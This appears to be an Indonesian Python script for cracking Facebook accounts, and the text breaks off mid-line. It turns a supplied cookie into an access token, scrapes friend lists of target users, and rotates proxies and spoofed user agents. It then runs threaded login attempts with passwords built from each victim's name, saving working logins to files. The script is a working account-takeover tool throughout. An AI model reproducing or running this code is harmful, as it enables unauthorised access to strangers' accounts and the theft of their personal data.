#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
ualu,ualuh = [],[]
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for t in range(10000):
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(113,117)
	h=random.randrange(11,19)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	LORD1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	LORD2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	LORD3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	LORD4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	LORD5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	uaku2 = random.choice([LORD1,LORD2,LORD3,LORD4,LORD5])
	ugen.append(uaku2)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f'[{x}•] ᴠᴇʀsɪᴏɴ : {h}VALIDATE{x} MODE')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cok = input('\n[!] Masukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					tok = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(tok)
					cokiew = open(".cok.txt", "w").write(cok)
					print(f'\n[!] Login is successful, rerun the command')
				else:
					exit('\n[+] login failed')
		
	except Exception as e:
		print('\n[!] Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(f'========================================') 
	print(f'{h}• Status : PREMIUM {x} ') 
	print(f'{h}• Recode : RAGHAV{x}') 
	print(f'========================================') 
	print(f'├──> Your ID :{h} '+str(my_id))
	print(f'{x}├──> Your IP  :{h} {ip}{x}')
	print(f'========================================') 
	print('')
	print(f'[•]1.Crack Public Mass')
	print(f'[•]2.Crack Public')
	print(f'[•]3.Check results') 
	print(f'[•]4.Crack File ') 
	print(f'[•]0.Exit  ')
	print(f'========================================') 
	_____RAGHAV__LORD_____ = input('\n├──> Select : ')
	print(f'========================================') 
	if _____RAGHAV__LORD_____ in ['1']:
		dump_massal()
	elif _____RAGHAV__LORD_____ in ['2']:
		dump()
	elif _____RAGHAV__LORD_____ in ['3']:
		result()
	elif _____RAGHAV__LORD_____ in ['4']:
		crack_file()
	elif _____RAGHAV__LORD_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('├──> Successful Logout+Delete Cookies ')
		exit()
	else:
		print('├──> Choose the Correct One ')
		back()
def error():
	print(f'{k}├──> Sorry, this feature is still being improved {x}')
	time.sleep(4)
	back()
	#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		print('╰─ File Not Found ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('╰─ You Don't Have a Dump File ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('╰─ %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n╰─ Chouse : ')
		print('')
		try:geh = lol[geeh]
		except KeyError:
			print(f'╰─{k} Choose the Right One  {x}')
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			print('╰─ File not found, Try again later ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------------[ CRACK-PUBLIC ]----------------#
def dump():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		a = input(' masukan id target: ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			print('Total Dump : {}'.format(len(id)));setting()
		except Exception as e:
			print(e)
#-------------------[ CRACK-PUBLIC ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'├──> Mau Berapa ID ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'├──> ID Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("├──> Total DUMP  : "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('[1] Results OK Check ')
	print('[2] Results CP Check ')
	print('[3] Return	')
	kz = input(f'\n├──> Select : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('├──> File Not Found ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('├──> You Have No Results CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'├──> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n├──> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('├──> Choose the Right One ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('├──> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}├──> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('├──> File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('├──> You Don't Have Files OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'├──> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'├──> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('├──> Choose the Right One ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('├──> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}├──> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('├──> Choose the Right One ')
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'========================================') 
	print(f'{x}├──> 1. tua ')
	print('├──> 2. muda ')
	print('├──> 3. Random ')
	print(f'========================================') 
	print('')
	hu = input('├──> Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('├──> Choose the Right Control ')
		exit()
	print(f'========================================') 
	print('├──> 1. Mobile ')
	print('├──> 2. Mbasic ')
	print('├──> 3. Async ')
	print('├──> 4. Regular ')
	print(f'========================================') 
	print('')
	hc = input('├──> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('async')
	elif hc in ['4','04']:
		method.append('regular')
	else:
		method.append('mobile')
	print('')
	pwplus=input('├──> Add Password Manually ( y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'=================================================') 
		print(f'Enter an additional password, minimum 6 letters') 
		print(f'{h}CONTOH{x} : kontolodon,memekk/Nama Daerah Kalian') 
		print(f'=================================================') 
		pwku=input('├──> : {hh}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		
	uatambah = input(f'├──>Add User-Agent Manual ? ( y/t ) ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bjir = input(f'├──> Enter User-Agent : {u}')
		ualu.append(bjir)
	else:
		ualuh.append('tidak')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'========================================================') 
	print(f'> {m}•{k}•{h}•{x} Hacking The World {m}•{k}•{h}•{x} < ')
	print(f'> Hasil {h}OK{x} Saved In : {h}OK/%s {x}'%(okc))
	print(f'> Hasil {k}CP{x} Saved In : {k}CP/%s {x}'%(cpc))
	print(f'> Play Airplane Mode If No Results')
	print(f'========================================================') 
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'async' in method:
				pool.submit(crackasync,idf,pwv)
			elif 'regular' in method:
				pool.submit(crackregular,idf,pwv)
			else:
				pool.submit(crackregular,idf,pwv)
	print('')
	print(f'========================================') 
	print(f'Successful Crack With Results') 
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print(f'Don't Forget to Be Thankful') 
	print(f'========================================') 
	print('')
	print('├──> Continue Crack Back ( y/t ) ? ')
	woi = input('├──> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}├──>{k} Good Bye{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1489897304628200&kid_directed_site=0&app_id=1489897304628200&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200%26cbt%3D1694434882102%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df850adb0aa7b2%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%26client_id%3D1489897304628200%26display%3Dtouch%26domain%3Dwww.blibli.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.blibli.com%252Flogin%253Fredirect%253D%25252F%26locale%3Den_US%26logger_id%3Df2eb5114cc8b6b%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28f5b050bbf53c%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%2526frame%253Df26cc15aab5eaf%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28f5b050bbf53c%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff25b7e9c1ad4e74%26relation%3Dopener%26frame%3Df26cc15aab5eaf%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=1489897304628200&kid_directed_site=0&app_id=1489897304628200&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200%26cbt%3D1694434882102%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df850adb0aa7b2%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%26client_id%3D1489897304628200%26display%3Dtouch%26domain%3Dwww.blibli.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.blibli.com%252Flogin%253Fredirect%253D%25252F%26locale%3Den_US%26logger_id%3Df2eb5114cc8b6b%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28f5b050bbf53c%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%2526frame%253Df26cc15aab5eaf%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fx